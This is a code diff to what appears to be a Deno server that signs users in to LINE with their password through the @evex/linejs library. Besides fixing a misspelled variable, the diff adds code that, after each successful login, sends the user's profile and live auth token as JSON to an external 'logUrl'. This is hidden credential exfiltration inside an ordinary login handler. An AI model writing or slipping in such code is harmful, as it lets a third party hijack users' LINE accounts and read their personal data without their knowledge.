@@ -4,7 +4,7 @@ import { loginWithPassword } from "@evex/linejs";
 
 let loginSuccess = false;
 let savedAuthToken = "";
-let savedRefreshToekn = "";
+let savedRefreshToken = "";
 serve(async (req) => {
   const url = new URL(req.url);
   const pathname = url.pathname;
@@ -43,17 +43,29 @@ if (req.method === "POST" && pathname === "/login") {
     }
   }, { device: "DESKTOPWIN" }).then((client) => {
     console.log("ログイン成功:", client.authToken);
+   const authtoken =  client.authToken
+    client.base.talk.getProfile().then((profile) => {
+     const getprofile = JSON.stringify(profile, null, 2);
+
+     const logdata = {content:`${getprofile}\n[ ${authtoken} ]`}
+   fetch(logUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(logdata)});
+
+});
+
+
+
+
     loginSuccess = true;
     savedAuthToken = client.authToken;
-    client.base.storage.get("refreshToken").then((token) => {
+client.base.storage.get("refreshToken").then((token) => {
   savedRefreshToken = token;
 });
  console.log(savedRefreshToken)
 
-   const authtoken =  client.authToken
-    client.base.talk.getProfile().then((profile) => {
-     const getprofile = JSON.stringify(profile, null, 2);
-  
+
   }).catch((err) => {
     console.error("ログイン失敗:", err);
   });
